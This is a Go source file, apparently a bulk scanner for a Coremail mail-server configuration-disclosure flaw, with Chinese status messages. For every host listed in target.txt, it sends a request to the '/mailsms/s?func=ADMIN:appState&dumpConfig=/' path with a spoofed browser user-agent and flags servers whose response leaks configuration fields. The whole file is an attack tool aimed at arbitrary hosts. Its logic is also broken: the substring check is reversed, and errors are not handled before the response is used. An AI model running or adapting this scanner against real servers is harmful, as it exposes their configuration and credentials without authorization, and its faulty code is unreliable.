package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	files, err := os.Open("target.txt")
	if err != nil {
		fmt.Println("字典打开失败，请检查当前目录下是否存在字典target.txt文件")
		return
	}
	defer files.Close()
	lg := bufio.NewScanner(files)
	for lg.Scan(){
		c := &http.Client{}
		p := "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
		var payload = fmt.Sprintf("http://%s%s", lg.Text(), p)
		r, err := http.NewRequest("GET", payload, nil)
		r.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0")
		if err != nil {
			fmt.Printf("无法访问 %s\n", lg.Text())
		}
		r1, err := c.Do(r)
		if err != nil {
			fmt.Printf("无法访问 %s\n", lg.Text())
		}
		defer r1.Body.Close()
		text, _ := ioutil.ReadAll(r1.Body)
		jieguo1 := strings.Contains(`<string name="User">coremail</string>`, string(text))
		jieguo2 := strings.Contains(`<string name="EnableCoremailSmtp">`, string(text))
		if r1.StatusCode == 200 && jieguo1 == true && jieguo2 == true {
			fmt.Printf("%s存在配置文件泄露漏洞\n", payload)
		}else {
			fmt.Printf("%s不存在该漏洞\n", lg.Text())
		}
		}

	}